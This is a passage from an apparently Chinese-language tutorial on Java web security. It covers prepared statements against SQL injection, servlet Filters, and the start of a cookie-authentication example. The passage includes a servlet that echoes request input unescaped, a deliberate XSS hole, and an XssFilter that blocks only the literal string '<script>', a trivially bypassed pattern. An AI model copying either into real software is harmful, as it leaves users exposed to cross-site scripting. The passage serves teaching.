                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397281497000" title="Toggle" aria-expanded="false" aria-controls="code-1769750397281497000" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397281497000-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// 预编译写法:safesql 是一个预编译的 SQL 查询语句，其中 ? 是一个占位符，表示将在执行时动态替换。</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="n">String</span><span class="w"> </span><span class="n">safesql</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;SELECT * FROM news WHERE id=?&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">// 使用PreparedStatement:PreparedStatement 是 Statement 的子接口，用于执行预编译的 SQL 语句。通过调用 connection.prepareStatement(safesql) 创建一个 PreparedStatement 对象。</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="k">try</span><span class="w"> </span><span class="p">(</span><span class="n">PreparedStatement</span><span class="w"> </span><span class="n">preparedStatement</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">connection</span><span class="p">.</span><span class="na">prepareStatement</span><span class="p">(</span><span class="n">safesql</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 设置参数，防止SQL注入攻击,使用 setXXX 方法设置占位符的值。在这里，使用 setInt(1, id) 将 id 的值设置到第一个占位符上。这种方式防止了 SQL 注入攻击，因为参数值是通过预编译的方式传递的，而不是通过直接拼接字符串。</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">preparedStatement</span><span class="p">.</span><span class="na">setInt</span><span class="p">(</span><span class="n">1</span><span class="p">,</span><span class="w"> </span><span class="n">id</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 执行查询,调用 executeQuery() 执行查询，得到 ResultSet 对象。</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="n">ResultSet</span><span class="w"> </span><span class="n">resultSet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">preparedStatement</span><span class="p">.</span><span class="na">executeQuery</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 处理结果集,根据业务需要，处理查询结果集的数据</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">SQLException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><h2 id="过滤器-filter">过滤器-Filter<a hidden class="anchor" aria-hidden="true" href="#过滤器-filter">#</a></h2>
<p>Filter被称为过滤器，过滤器实际上就是对Web资源进行拦截，做一些处理后再交给下一个过滤器或Servlet处理，通常都是用来拦截request进行处理的，也可以对返回的 response进行拦截处理。开发人员利用filter技术，可以实现对所有Web资源的管理，例如实现权限访问控制、过滤敏感词汇、压缩响应信息等一些高级功能。</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300902142.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300901515.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300901152.png" style="max-width: 100%; height: auto;"></p>
<h4 id="创建过滤器">创建过滤器<a hidden class="anchor" aria-hidden="true" href="#创建过滤器">#</a></h4>
<h4 id="1创建过滤器之前的准备">1、创建过滤器之前的准备<a hidden class="anchor" aria-hidden="true" href="#1创建过滤器之前的准备">#</a></h4>
<p>创建新的项目FilterDemo1<br>
在对应的包名上，创建分类包filter与servlet<br>
在servlet下创建TestServlet ，并进行检测<br>
启动服务器，尝试进行Xss攻击，发现可以</p>
<div class="code-block-container" id="code-1769750397284538300" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397284538300">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397284538300" title="Toggle" aria-expanded="false" aria-controls="code-1769750397284538300" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397284538300-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//TestServlet</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">protected</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">doGet</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">req</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">resp</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="p">,</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 从请求中获取名为 &#34;code&#34; 的参数值</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">req</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;code&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 获取用于将输出发送回客户端的 PrintWriter 对象</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">PrintWriter</span><span class="w"> </span><span class="n">out</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">resp</span><span class="p">.</span><span class="na">getWriter</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 将 &#34;code&#34; 参数的值打印到客户端</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">code</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 刷新 PrintWriter，确保立即发送任何缓冲的内容</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">out</span><span class="p">.</span><span class="na">flush</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 关闭 PrintWriter 以释放资源</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">out</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><h4 id="2创建过滤器">2、创建过滤器<a hidden class="anchor" aria-hidden="true" href="#2创建过滤器">#</a></h4>
<h4 id="3过滤器内置方法">3、过滤器内置方法<a hidden class="anchor" aria-hidden="true" href="#3过滤器内置方法">#</a></h4>
<p>在对应的filter下创建XssFilter并实现Filter 接口中的所有方法</p>
<div class="code-block-container" id="code-1769750397289474600" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397289474600">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397289474600" title="Toggle" aria-expanded="false" aria-controls="code-1769750397289474600" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397289474600-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span><span class="lnt" id="22"><span class="lnlinks">22</span>
</span><span class="lnt" id="23"><span class="lnlinks">23</span>
</span><span class="lnt" id="24"><span class="lnlinks">24</span>
</span><span class="lnt" id="25"><span class="lnlinks">25</span>
</span><span class="lnt" id="26"><span class="lnlinks">26</span>
</span><span class="lnt" id="27"><span class="lnlinks">27</span>
</span><span class="lnt" id="28"><span class="lnlinks">28</span>
</span><span class="lnt" id="29"><span class="lnlinks">29</span>
</span><span class="lnt" id="30"><span class="lnlinks">30</span>
</span><span class="lnt" id="31"><span class="lnlinks">31</span>
</span><span class="lnt" id="32"><span class="lnlinks">32</span>
</span><span class="lnt" id="33"><span class="lnlinks">33</span>
</span><span class="lnt" id="34"><span class="lnlinks">34</span>
</span><span class="lnt" id="35"><span class="lnlinks">35</span>
</span><span class="lnt" id="36"><span class="lnlinks">36</span>
</span><span class="lnt" id="37"><span class="lnlinks">37</span>
</span><span class="lnt" id="38"><span class="lnlinks">38</span>
</span><span class="lnt" id="39"><span class="lnlinks">39</span>
</span><span class="lnt" id="40"><span class="lnlinks">40</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//XssFilter</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="nd">@WebFilter</span><span class="p">(</span><span class="s">&#34;/test&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">XssFilter</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">Filter</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 中间件启动后就自动运行</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">init</span><span class="p">(</span><span class="n">FilterConfig</span><span class="w"> </span><span class="n">filterConfig</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;xss开启过滤&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 中间件关闭后就自动运行</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">destroy</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;xss销毁过滤&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// doFilter 访问路由触发的方法</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">doFilter</span><span class="p">(</span><span class="n">ServletRequest</span><span class="w"> </span><span class="n">servletRequest</span><span class="p">,</span><span class="w"> </span><span class="n">ServletResponse</span><span class="w"> </span><span class="n">servletResponse</span><span class="p">,</span><span class="w"> </span><span class="n">FilterChain</span><span class="w"> </span><span class="n">filterChain</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ServletException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;xss正在过滤&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 过滤代码就应该在放行前</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 如果符合就放行，不符合就过滤（拦截）</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// XSS过滤 接受参数值 如果有攻击payload 就进行拦截</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 接受参数值 如果没有攻击payload 就进行放行</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="p">)</span><span class="w"> </span><span class="n">servletRequest</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;code&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">code</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="s">&#34;&lt;script&gt;&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">// 没有攻击payload</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// 放行</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">filterChain</span><span class="p">.</span><span class="na">doFilter</span><span class="p">(</span><span class="n">servletRequest</span><span class="p">,</span><span class="w"> </span><span class="n">servletResponse</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;存在XSS攻击&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// 继续拦截</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// 这里可以根据需要添加拦截后的处理逻辑，例如记录日志、返回错误信息等</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><h4 id="4过滤器触发流程">4、过滤器触发流程<a hidden class="anchor" aria-hidden="true" href="#4过滤器触发流程">#</a></h4>
<div class="code-block-container" id="code-1769750397294910700" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397294910700">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397294910700" title="Toggle" aria-expanded="false" aria-controls="code-1769750397294910700" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397294910700-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@WebFilter</span><span class="p">(</span><span class="s">&#34;/test&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">filter</span><span class="o">&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">filter</span><span class="o">-</span><span class="n">name</span><span class="o">&gt;</span><span class="n">xssFilter</span><span class="o">&lt;/</span><span class="n">filter</span><span class="o">-</span><span class="n">name</span><span class="o">&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">filter</span><span class="o">-</span><span class="kd">class</span><span class="err">&gt;</span><span class="nc">com</span><span class="p">.</span><span class="na">example</span><span class="p">.</span><span class="na">filter</span><span class="p">.</span><span class="na">xssFilter</span><span class="o">&lt;/</span><span class="n">filter</span><span class="o">-</span><span class="kd">class</span><span class="err">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">&lt;/</span><span class="nc">filter</span><span class="o">&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">filter</span><span class="o">-</span><span class="n">mapping</span><span class="o">&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">filter</span><span class="o">-</span><span class="n">name</span><span class="o">&gt;</span><span class="n">xssFilter</span><span class="o">&lt;/</span><span class="n">filter</span><span class="o">-</span><span class="n">name</span><span class="o">&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">url</span><span class="o">-</span><span class="n">pattern</span><span class="o">&gt;/</span><span class="n">test</span><span class="o">&lt;/</span><span class="n">url</span><span class="o">-</span><span class="n">pattern</span><span class="o">&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="n">filter</span><span class="o">-</span><span class="n">mapping</span><span class="o">&gt;</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><h4 id="5利用过滤器简单实现cookie身份验证">5、利用过滤器简单实现：cookie身份验证<a hidden class="anchor" aria-hidden="true" href="#5利用过滤器简单实现cookie身份验证">#</a></h4>
<p>在servlet下创建AdminServlet，</p>
<div class="code-block-container" id="code-1769750397296322200" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397296322200">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397296322200" title="Toggle" aria-expanded="false" aria-controls="code-1769750397296322200" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397296322200-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
</span><span class="lnt" id="2"><span class="lnlinks">2</span>
</span><span class="lnt" id="3"><span class="lnlinks">3</span>
</span><span class="lnt" id="4"><span class="lnlinks">4</span>
</span><span class="lnt" id="5"><span class="lnlinks">5</span>
</span><span class="lnt" id="6"><span class="lnlinks">6</span>
</span><span class="lnt" id="7"><span class="lnlinks">7</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@WebServlet</span><span class="p">(</span><span class="s">&#34;/admin&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">AdminServlet</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">HttpServlet</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
